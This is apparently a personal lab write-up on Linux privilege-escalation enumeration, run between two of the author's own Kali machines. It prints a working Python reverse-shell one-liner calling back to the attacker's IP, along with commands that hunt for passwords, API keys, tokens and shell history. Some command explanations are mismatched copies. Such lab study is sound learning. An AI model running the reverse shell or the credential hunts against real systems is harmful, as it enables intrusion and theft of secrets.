## Scope:
- **Attacker**: Kali Linux Windows WSL (172.20.155.246)
- **Victim**: Kali Linux (192.168.127.128)



## What is System Enumeration?
System Enumeration is the process of gathering information about a target system to identify potential vulnerabilities and attack vectors for privilege escalation. It's the FIRST and MOST CRITICAL step after gaining initial access.





## Why Enumeration is Crucial?
- You can't exploit what you don't know exists
- Every system is unique - different configurations, different vulnerabilities
- Saves time by focusing on realistic attack paths


## Why is Enumeration Important?
- Thw first thing we should do once we obtain a reverse shell into a linux system is `Enumeration`.
- Enumeration is all about gathering meaningful infomaation regarding the system we're dealing with.
- A proper enumeration procedure will allow our to understand the specific configurations being deployed on the system, and, more inportantly, what are the vulnerable aspects of the system.
- Once we understand the vulnerabilities, we can then exploit them to elevate our privileges.




## The Enumeration Mindset
hink Like a Detective:
- What's here? (Files, users, services)
- What can I access? (Permissions, readable files)
- What's running? (Processes, services)
- What's misconfigured? (SUID, cron, sudo)
- What's vulnerable? (Old software, weak permissions)


## What to Enumerate?
In terms of what to enumerate, the following areas are key points to focus on:
• hardware architecture
• kernel version
• linux distribution + version
• users and groups ()
• access to powerful groups (e.g., , ...)
• sudo configuration ()
• filesystem directories (, , )
• SUID/SGID binaries
• local services
• network interfaces
• software installed with versions
• backups / saved sessions
• repositories under version control systems (, )
• cronjobs (discussed in a later video)
• capabilities (discussed in a later video)








# System Enumeration Methodology
- In this i used `TArget` is my `Ubuntu` and Attacker



## 1. Systematic Enumeration
- On **attacker**:
````
nc -lvnp 4444
````
<img width="427" height="162" alt="image" src="https://github.com/user-attachments/assets/71a42bd3-efb5-4183-a55c-c2523104a748" />


- In this first the target run my `Reverse shell` on terminal:
````
python -c 'import socket,os,pty;s=socket.socket();s.connect(("172.20.155.246",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
````
<img width="1876" height="138" alt="image" src="https://github.com/user-attachments/assets/cc7f23b5-7723-43ae-b873-64f9b95b8306" />

- Now we got target shell, after go back to attacker:
<img width="875" height="295" alt="image" src="https://github.com/user-attachments/assets/27f44ca7-87fa-4875-a5a0-e3b5d3fb3e92" />

- Now we got target shell.

- `/etc/*-release`: Matches any file in `/etc` ending with `-release`.
- Others:
  - `/etc/os-release`: Standard file with OS name, version, ID, and pretty name.
  - `/etc/lsb-release`: Sometimes present, gives Linux Standard Base info.
  - `/etc/redhat-release`, `/etc/debian_version`: Distro-specific release files


### User & Group Enumeration

#### Current user info

#### All users:
````
cat /etc/passwd
````
<img width="970" height="957" alt="image" src="https://github.com/user-attachments/assets/fe3dbc29-5fc1-4e39-8999-232cfc11be9e" />

````
cut -d: -f1 /etc/passwd
````
<img width="492" height="1006" alt="image" src="https://github.com/user-attachments/assets/e02da3af-dfc5-4cd7-b47c-1b653f34c732" />

<img width="431" height="786" alt="image" src="https://github.com/user-attachments/assets/bb68f80f-d2c4-429e-a61d-795e8b7b2bf0" />

- `cut`: Extracts sections of each line in a file.
- `-d:`: Sets the delimiter to : (colon). The /etc/passwd file uses colons to separate fields.
- `-f1`: Selects the first field.
- `/etc/passwd`: The file that stores user account information (not passwords anymore, just metadata).
- this command is a staple in **privilege escalation** because it’s a fast way to fingerprint users before testing escalation paths.

````
getent passwd
````
<img width="1078" height="997" alt="image" src="https://github.com/user-attachments/assets/d5986ea7-e9f2-4881-a4d8-5bf8b3715912" />

- `getent`:  A tool that queries system databases defined in the Name Service Switch (NSS).
- `passwd`: Refers to the user account database (same info you’d see in `/etc/passwd`).
- This command lists all user accounts on the system, but not just from the local `/etc/passwd` file — it also includes accounts from remote sources (like LDAP, NIS, or Active Directory) if your system is connected to them.




#### All groups
````
cat /etc/group
````
<img width="529" height="993" alt="image" src="https://github.com/user-attachments/assets/ba94a339-1670-4b9a-9bd1-ed42c81ab507" />

- `/etc/group` A text file that stores group account information on a Linux system.
-  This command is used to view all groups and their members on a Linux system, which is essential for managing permissions and security.



````
getent group
````
<img width="494" height="1001" alt="image" src="https://github.com/user-attachments/assets/fba5b589-93d8-4f04-9e18-9f226cc1b321" />

- `getent`: Stands for get entries. It’s a Linux/Unix command used to fetch entries from system databases that are configured in the Name Service Switch (NSS).
- `group`: This specifies the database you want to query. In this case, the group database, which contains information about system groups.
- is used to list all groups recognized by the system (local + network sources), making it more flexible and reliable than just reading `/etc/group`.

#### Check for interesting process:
````
ps aux | grep -E "(root|admin|backup|cron)"
````
<img width="1277" height="975" alt="image" src="https://github.com/user-attachments/assets/34efb346-289e-40d5-8361-4458c16b561b" />

- `ps`: Stands for process status. It shows running processes on the system.
- `aux`: These are options for ps:
  - `a`: Show processes for all users (not just the current one).
  - `u`: Display user-oriented format (shows the user who owns the process).
  - `x`: Include processes not attached to a terminal (like daemons).
- `| **(pipe)**`: Sends the output of `ps aux` into the next command (`grep`).
- `grep -E`: Searches text using extended regular expressions.
- `"(root|admin|backup|cron)"` → The regex pattern. It matches any line containing root, admin, backup, or cron.
- This command is used to filter running processes for specific critical users or services (root, admin, backup, cron). It’s a quick way to spot important or suspicious activity.




### File System Enumeration

#### Check disk usage
````
df -h
lsblk
````
<img width="903" height="975" alt="image" src="https://github.com/user-attachments/assets/e86d92f3-1506-44e1-bf28-2cb472d7a520" />


#### Find interesting directories
````
ls -la /home/
ls -la /opt/
ls -la /var/www/
ls -la /tmp/
ls -la /dev/shm/
````
<img width="653" height="571" alt="image" src="https://github.com/user-attachments/assets/630b39fd-218a-4ae8-aa8b-f044002cc0d2" />

<img width="1419" height="602" alt="image" src="https://github.com/user-attachments/assets/7119c525-93d4-43eb-a15b-9f7dfc11b3c8" />



#### Find SUID files
````
find / -type f -perm -4000 2>/dev/null
````
<img width="699" height="1000" alt="image" src="https://github.com/user-attachments/assets/3ccb838b-2b43-4d57-80c3-64919ca69b3d" />

<img width="773" height="520" alt="image" src="https://github.com/user-attachments/assets/610c0df7-b25b-490d-9449-7720a7697314" />

- `find /`: Start searching from the root directory (`/`), meaning the entire filesystem.
- `-type f`: Restrict the search to files (not directories, links, etc.).
- `-perm -4000`: Match files with the SUID bit set:
  - `4000` is the octal permission for the SUID (Set User ID) bit.
  - SUID means when the file is executed, it runs with the privileges of the file’s owner (often root).
- `2>/dev/null`: Redirect error messages (like "Permission denied") to /dev/null (a black hole), so only valid results are shown.
- This command is used to find all SUID files on the system, which is critical for both attackers (privilege escalation) and defenders (hardening and auditing).



#### Find SGID files
````
find / -type f -perm -2000 2>/dev/null
````
<img width="715" height="474" alt="image" src="https://github.com/user-attachments/assets/ddf7fa47-a470-49cd-b0d6-2bff9dde21d9" />

- `-perm -2000`: Match files with the SGID (Set Group ID) bit set:
  - `2000` is the octal permission for SGID.
  - SGID means when the file is executed, it runs with the privileges of the file’s group owner.
- This command is used to find all SGID files on the system, which is critical for both attackers (group privilege escalation) and defenders (auditing and hardening).



#### Find world-writable files
````
find / -type f -perm -0002 2>/dev/null
````
<img width="451" height="786" alt="image" src="https://github.com/user-attachments/assets/196734a8-3d4f-4a98-b5f9-4a502d84a16c" />

- `-perm -0002`: Match files with the world-writable bit set:
  - `0002` is the octal permission for "others can write".
  - World-writable means any user on the system can modify the file
- This command lists all files on the system that anyone can write to, regardless of ownership.
- This command is used to find all files that anyone can write to, which is crucial for spotting misconfigurations and potential privilege escalation paths



#### Find world-writeable files
````
find / -type f -perm -0004 2>/dev/null
````
<img width="658" height="707" alt="image" src="https://github.com/user-attachments/assets/aeee760b-79da-468d-b0c9-994fe628ffe5" />

- `-perm -0004`: Match files with the world-readable bit set:
  - `0004` is the octal permission for "others can read".
  - World-readable means any user on the system can read the file’s contents
- This command is used to find all files that anyone can read, which is critical for spotting misconfigurations and potential information disclosure risks



#### Find files owned by current user
````
find / -user $(whoami) 2>/dev/null
````
<img width="881" height="754" alt="image" src="https://github.com/user-attachments/assets/d3d8bab4-6b76-4051-a847-696fab92bb7d" />

- `-user $(whoami)`: Restrict results to files owned by the user returned by whoami.
  - `whoami`: Prints the current logged-in username.
  - `$(whoami)`: Command substitution; replaces `$(whoami)` with your actual username.
- This command is used to find all files owned by the current user across the system, which is useful for both auditing and privilege escalation reconnaissance.


#### Find files owned by root but writable by us
````
find / -type f -user root -perm -o=w 2>/dev/null
````
<img width="615" height="753" alt="image" src="https://github.com/user-attachments/assets/6d72516f-97b3-4dd8-9cc0-e24fd8ef8a22" />

- `-user root`: Only return files owned by the root user.
- `-perm -o=w`: Match files that are world‑writable (o=w means "others have write permission").
- This command is used to find root‑owned files that anyone can write to, which is one of the most critical checks in privilege escalation and system hardening.




### Service & Configuration Enumeration

#### Running services
````
systemctl list-units --type=service --state=running

## 2. Cooprehensive Enumeration Script:

### System Enum
````
sudo mousepad sys_enum.sh
````
````
echo "=== 1. SYSTEM INFORMATION ==="
echo "Hostname: $(hostname)"
echo "Kernel: $(uname -a)"
echo "OS: $(cat /etc/*release 2>/dev/null || echo "Not found")"
echo "Uptime: $(uptime)"
echo ""
````
<img width="1901" height="506" alt="image" src="https://github.com/user-attachments/assets/a636f3ef-b61c-4a4c-9469-765b3f155fca" />

- IN this we can use full command in this it look so good, But in this when  I remote from kali to windows it hard to write
- OThers command that we can use about script. In this i dont show demo.


### PRIVILEGE INFORMATION
````
sudo mousepad priv_infor.sh
````

- Now if we want to seee details view it all, but in this it alots so I don't view all.


#### Linpeas Fast scan:
````
./linpeas.sh -fast
````
<img width="1919" height="925" alt="image" src="https://github.com/user-attachments/assets/fea3384c-c9c3-4628-adab-722f013734c1" />

### LinEnum:
#### Download:
````
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
````
<img width="1371" height="461" alt="image" src="https://github.com/user-attachments/assets/af158365-a7f0-4690-9c2d-3e69da209056" />

####

## 4. Critical Enumeration Targets for Privilege Escalation

### 1. SUID/SGID Binaries
#### Comprehensive SUID check
````
find / -type f -perm -4000 2>/dev/null | while read file; do
    echo "=== $file ==="
    ls -la "$file"
    # Check if it's a known vulnerable binary
    if echo "$file" | grep -q -E "(find|bash|nano|vim|less|more|awk|python|perl|ruby)"; then
        echo "[!] POTENTIALLY DANGEROUS SUID: $file"
    fi
done
````
- In this we can use with file:
````
mousepad suid_check.sh
````
````
find / -type f -perm -4000 2>/dev/null | while read file; do
    echo "=== $file ==="
    ls -la "$file"
    # Check if it's a known vulnerable binary
    if echo "$file" | grep -q -E "(find|bash|nano|vim|less|more|awk|python|perl|ruby)"; then
        echo "[!] POTENTIALLY DANGEROUS SUID: $file"
    fi
done
````
- But in this it hard for my terminal that remote from kali to windows, so I do with above:
<img width="993" height="1014" alt="image" src="https://github.com/user-attachments/assets/3cf2c143-1ba9-4a24-95b5-41fe76348e16" />

- Now we was check SUID.


### 2. Sudo Privileges
#### Deep sudo analysis
````
sudo -l 2>/dev/null
````
<img width="797" height="226" alt="image" src="https://github.com/user-attachments/assets/5ada1d32-c3d4-45c7-b668-52aa984bae9d" />

#### Check /etc/sudoers.d/
````
ls -la /etc/sudoers.d/ 2>/dev/null
for file in /etc/sudoers.d/*; do
    [ -f "$file" ] && echo "=== $file ===" && cat "$file" 2>/dev/null
done
````
<img width="737" height="323" alt="image" src="https://github.com/user-attachments/assets/c904ddf0-9ca2-483e-8c50-239bcd1f8014" />



### 3. Cron Jobs
#### Comprehensive cron enumeration
````
echo "=== SYSTEM CRON ==="
ls -la /etc/cron* 2>/dev/null
cat /etc/crontab 2>/dev/null
for dir in /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly; do
    [ -d "$dir" ] && echo "=== $dir ===" && ls -la "$dir/"
done

echo "=== USER CRON ==="
for user in $(cut -d: -f1 /etc/passwd); do
    crontab -l -u "$user" 2>/dev/null && echo "=== $user's crontab ==="
done
````
<img width="747" height="912" alt="image" src="https://github.com/user-attachments/assets/e94275b6-cd9b-4aa2-b38d-a9d62332002e" />

<img width="683" height="481" alt="image" src="https://github.com/user-attachments/assets/5c63494f-5293-42be-b3d3-54507825ff2c" />

<img width="961" height="801" alt="image" src="https://github.com/user-attachments/assets/978cd4af-37c9-4839-9a26-fac9e0641c88" />



### 4. World-Writable Files & Directories

#### Critical writable directories
````
find / -type d \( -perm -0002 -a ! -perm -1000 \) 2>/dev/null
````
<img width="751" height="119" alt="image" src="https://github.com/user-attachments/assets/501e374a-d48f-4a1d-9cf8-850fef9f8150" />

- This command is used to find unsafe world-writable directories that lack sticky bit protection, which could allow users to delete or overwrite each other’s files — a classic privilege escalation vector.


####  Writable in PATH
````
echo $PATH | tr ':' '\n' | while read dir; do
    [ -w "$dir" ] && echo "[!] Writable PATH directory: $dir"
done
````
<img width="577" height="160" alt="image" src="https://github.com/user-attachments/assets/7b1ee6c8-67fd-47e9-80e8-df25c91e1f8c" />

<img width="475" height="158" alt="image" src="https://github.com/user-attachments/assets/539a3001-e961-45b4-9ddf-4319eb7491ae" />

- This will list all files in that directory, along with their permissions.

---



## 5. Service-Specific Enumeration

### 1. Web Services:
#### Check web directory
````
ls -la /var/www/
````
<img width="492" height="140" alt="image" src="https://github.com/user-attachments/assets/9efa4a20-b9fa-4839-91e0-90917f208e4e" />

#### Check web config:
````
find / -name "*.conf" -type f | xargs grep -l "DocumentRoot\|VirtualHost" 2>/dev/null
````
<img width="999" height="936" alt="image" src="https://github.com/user-attachments/assets/b1e6ef46-b408-45db-af5a-20f2a53bb0d8" />

- But in this it need permission.



### 2. Database Services:

#### Check if MySQL/MariaDB running
````
ps aux | grep -E "(mysql|mariadb)"
````
<img width="546" height="121" alt="image" src="https://github.com/user-attachments/assets/1cd92572-d802-43ea-9bdb-e0cb571a8dbc" />

- Check:
````
cat /etc/mysql/my.cnf
````
<img width="880" height="558" alt="image" src="https://github.com/user-attachments/assets/b1e468a9-12cd-4ef2-97ca-aab98000873b" />


#### Look for config files
````
find / -name "my.cnf" -o -name ".my.cnf" 2>/dev/null
````
<img width="679" height="117" alt="image" src="https://github.com/user-attachments/assets/f27f2f93-51ce-4a28-99dd-5ec30d3f738f" />

- `find /`: Search starting from the root directory (`/`), meaning the entire filesystem.
- `-name "my.cnf"`: Look for files named `my.cnf` (the main MySQL/MariaDB configuration file).
- `-o -name ".my.cnf"`: OR condition: also look for files named `.my.cnf` (user‑specific MySQL config file, usually in home directories).
- `2>/dev/null`: Redirect error messages (like "Permission denied") to `/dev/null`, so only valid results are shown.
- This command is used to find MySQL/MariaDB configuration files across the system, which is critical for both administrators (to manage configs) and attackers (to discover stored credentials for privilege escalation).



````
find / -name "pg_hba.conf" -o -name "postgresql.conf" 2>/dev/null
````
<img width="811" height="757" alt="image" src="https://github.com/user-attachments/assets/8cfed6bb-72c5-41cb-af09-fcb2a73db240" />

<img width="933" height="920" alt="image" src="https://github.com/user-attachments/assets/202e0116-a89f-4759-ae58-cb5f627a2b90" />

- `find /`: Search starting from the root directory (`/`), meaning the entire filesystem.
- `-name "my.cnf"`: Look for files named my.cnf (the main MySQL/MariaDB configuration file).
- `-o -name ".my.cnf"`: OR condition: also look for files named .my.cnf (user‑specific MySQL config file, usually in home directories).
- `2>/dev/null`: Redirect error messages (like "Permission denied") to /dev/null, so only valid results are shown.
- This command is used to find MySQL/MariaDB configuration files across the system, which is critical for both administrators (to manage configs) and attackers (to discover stored credentials for privilege escalation).



### 3. SSH Service:
#### SSH config
````
ls -la ~/.ssh/
````
<img width="561" height="179" alt="image" src="https://github.com/user-attachments/assets/65fb8e9e-248b-41b4-91f4-e600c9de2133" />

````
cat ~/.ssh/known_hosts
````
<img width="1902" height="320" alt="image" src="https://github.com/user-attachments/assets/cc5c18c4-b9b7-4895-9a66-cf496ab0fb95" />


#### System SSH config
````
cat /etc/ssh/sshd_config 2>/dev/null | grep -v "^#"
````
<img width="568" height="603" alt="image" src="https://github.com/user-attachments/assets/4d9142fd-d986-4f79-a6c0-c3e5fcfb2737" />

- `cat /etc/ssh/sshd_config`: Reads the SSH daemon config file.
- `2>/dev/null`: Suppresses error messages (e.g., if the file doesn’t exist).
- `grep -v "^#"`: Filters out lines that start with `#` (comments), showing only active directives.
- This command shows you the active SSH server settings, skipping comments, so you can audit or troubleshoot SSH behavior clearly.




---




## 6. File Content Enumeration

### 1. Look for Secrets:

#### Search for passwords in files
````
grep -r "password\|passwd\|pwd" /etc/ /home/ /opt/ 2>/dev/null | grep -v ".git"

- `grep -r`: Recursively search through files in the given directories.
- `"password\|passwd\|pwd"`: Regex pattern: look for any of these strings:
  - `password`
  - `passwd`
  - `pwd`
- `/etc/ /home/ /opt/`: Directories to search:
  - `/etc/`: System configs.
  - `/home/`: User files.
  - `/opt/`: Optional software installs.
- `2>/dev/null`: Suppress error messages (like "Permission denied").
- `| grep -v ".git"`: Exclude results from `.git` directories (to avoid noise from version control metadata).
- This command is used to hunt for plaintext passwords or password variables across critical directories, excluding `.git` noise. It’s a powerful reconnaissance step in both exploitation and defense.



#### Search for API keys, tokens
````
grep -r "api[_-]key\|token\|secret\|key" /etc/ /home/ /opt/ 2>/dev/null | grep -v ".git"
````
<img width="1659" height="1010" alt="image" src="https://github.com/user-attachments/assets/9aac3188-99b0-4409-9c3b-a2ae7d3ec05c" />

- `grep -r`: Recursively search through files in the given directories.
- `"api[_-]key\|token\|secret\|key"`: Regex pattern:
  - `api[_-]key`: Matches api_key or api-key.
  - `token`: Matches any mention of tokens (often used for authentication).
  - `secret`: Matches secrets (like secret=...).
  - `key`: Matches generic keys (like private_key).
- `/etc/ /home/ /opt/`: Directories to search:
  - `/etc/`: System configs.
  - `/home/`: User files.
  - `/opt/`: Optional software installs.
- `2>/dev/null`: Suppress error messages (like "Permission denied").
- `| grep -v ".git"`: Exclude results from .git directories (to avoid version control noise).
- This command is used to hunt for API keys, tokens, and secrets across critical directories, excluding `.git` noise. It’s a powerful way to uncover misconfigurations and potential exploitation paths.



#### Check history files
````
cat ~/.bash_history
````
<img width="703" height="1000" alt="image" src="https://github.com/user-attachments/assets/87685313-ef96-4bf8-9742-ba73f1f1859f" />


````
cat ~/.zsh_history 2>/dev/null
````
<img width="1058" height="1001" alt="image" src="https://github.com/user-attachments/assets/6e2c00ae-8df1-4f74-b9c2-85261a258bfc" />


### 2. Check Backup Files:
Common backup locations:
````
ls -la /var/backups/
````
<img width="741" height="833" alt="image" src="https://github.com/user-attachments/assets/817fbbbc-c4f2-44c6-8935-46ae8fe30765" />

## 7. Kernel & System Vulnerabilities

### Kernel Inforation:
````
uname -a
cat /proc/version
````
<img width="1790" height="175" alt="image" src="https://github.com/user-attachments/assets/2019c869-1355-4212-85e8-69e41dd1c8cd" />


#### Check kernel modules
````
lsmod
````
<img width="915" height="801" alt="image" src="https://github.com/user-attachments/assets/f5dfc302-1cf1-4be9-b21a-2ac1123edd9b" />


````
cat /proc/modules
````
<img width="951" height="792" alt="image" src="https://github.com/user-attachments/assets/c871274d-d602-45f6-929f-5218ef359eb0" />


#### Check for known vulnerable kernel versions:
````
uname -r
````
<img width="304" height="87" alt="image" src="https://github.com/user-attachments/assets/f1e82a93-1a22-474f-8ab9-74c6b8b2da63" />

- `uname`: PRints system information.
- `-r`: Show the kernel release version.
- `- 6.16.8`: The Linux kernel version you’re running.
  - Major version: `6` → You’re on the modern 6.x kernel line.
  - Minor version: `16.8` → Specific patch level release.
- `+kali` → Indicates this kernel build is customized/packaged by Kali Linux maintainers.
  - They often add patches, configs, or security tweaks.
- `amd64`: Architecture → 64‑bit x86 (Intel/AMD CPUs).



### System Architecture:
#### Check architecture:
````
arch
lscpu
````
<img width="982" height="790" alt="image" src="https://github.com/user-attachments/assets/5cb1b7e3-668f-4f3e-b6c0-6c29f89e97ee" />

<img width="1030" height="886" alt="image" src="https://github.com/user-attachments/assets/6f759af8-fb8b-4525-872a-2ab608803447" />

#### Check for 32-bit on 64-bit system:
````
file /bin/bash
````
<img width="1919" height="133" alt="image" src="https://github.com/user-attachments/assets/f10edc49-4dae-4ab8-8b58-a6764a50a8d2" />

## 8. Hidden Files & Directories

### Find hidden files
````
find / -type f -name ".*" 2>/dev/null | head -20
````
<img width="899" height="542" alt="image" src="https://github.com/user-attachments/assets/13cba938-3b6a-4615-93c7-a18adb4f5f00" />

- `find /`: Search starting from the root directory (`/`), meaning the entire filesystem.
- `-type f`: Restrict results to files only (not directories).
- `-name ".*"`: Match files whose names start with a dot (.).
  - These are hidden files in Linux/Unix systems.
- `2>/dev/null`: Suppress error messages (like "Permission denied").
- `| head -20`: Show only the first 20 results
- This command is used to find hidden files across the system, showing the first 20 results, which is a common reconnaissance step for both attackers (credential hunting) and admins (security auditing).



````
find /home -type f -name ".*" 2>/dev/null
````
<img width="659" height="124" alt="image" src="https://github.com/user-attachments/assets/b4f2013c-d79f-487f-b4c7-5fe7dce1f87f" />

- But in this it need permission, so just add `sudo`:
<img width="1900" height="1018" alt="image" src="https://github.com/user-attachments/assets/12050e1c-4e24-4ced-8dbf-9c68badadf6b" />

- `find /home`: Search inside the /home directory (where user accounts store their files).
- `-type f`: Restrict results to files only (not directories).
- `-name ".*"`: Match files whose names start with a dot (.).
  - These are hidden files in Linux.
- `2>/dev/null`: Suppress error messages (like "Permission denied").
- This command is used to find hidden files inside user home directories, which is a common reconnaissance step for both attackers (credential hunting) and admins (security auditing).




## Look for hidden directories
````
find / -type d -name ".*" 2>/dev/null | head -20
````
<img width="1116" height="550" alt="image" src="https://github.com/user-attachments/assets/7e9a6ac5-2829-420e-9e43-94b06e96c06f" />

- `find /`: Search starting from the root directory (/), meaning the entire filesystem.
- `-type d`: Restrict results to directories only.
- `-name ".*"`: Match directory names starting with a dot (.).
  - These are hidden directories in Linux/Unix.
- `2>/dev/null`: Suppress error messages (like "Permission denied").
- `| head -20`: Show only the first 20 results.
- This command is used to find hidden directories across the system, showing the first 20 results, a classic reconnaissance step for both attackers (credential hunting) and admins (security auditing).




### Check common hidden file locations
````
ls -la ~/.* 2>/dev/null
````
<img width="1078" height="788" alt="image" src="https://github.com/user-attachments/assets/2657be29-bda5-4283-a2f0-70b9968e2f9b" />

<img width="1484" height="985" alt="image" src="https://github.com/user-attachments/assets/61f2e596-c718-4e23-8391-8dc951149697" />

- `ls -la`: List files in long format (-l) and include hidden files (-a).
- `~/.*`: Expand to all hidden files and directories in your home directory (~).
  - The `.*` pattern matches anything starting with a dot (`.`), like `.bashrc`, `.ssh/`, `.profile`, `.config/`.
- `2>/dev/null`: Suppress error messages (like "Permission denied").
- This command lists **all hidden files and directories in your home folder**, showing permissions, ownership, and details — a key reconnaissance step for both **security auditing** and **privilege escalation labs**.

## Real-World Enumeration

### When we have SSH or shell access as regular user:

#### Step 1: Basic recon
````
whoami
id
uname -a
````

#### Step 2: Check for obvious privilege escalation
````
sudo -l
find / -type f -perm -4000 2>/dev/null | head -20
````

#### Step 3: Check cron jobs
````
ls -la /etc/cron*
crontab -l
````

#### Step 4: Check for writable files
````
find / -type f -writable 2>/dev/null | grep -v "/proc/" | head -20
````

#### Step 5: Check network services
````
netstat -antup
ps aux | grep root
````

#### Step 6: Look for credentials
````
grep -r "password" /home/ 2>/dev/null | head -10
cat ~/.bash_history | tail -50
````

#### Step 7: Check for backup files
````
ls -la /var/backups/
find / -name "*.bak" -o -name "*.old" 2>/dev/null | head -10
````

#### Step 8: Check capabilities
````
getcap -r / 2>/dev/null
````

- In this I don't show demo, cause I was show it above.
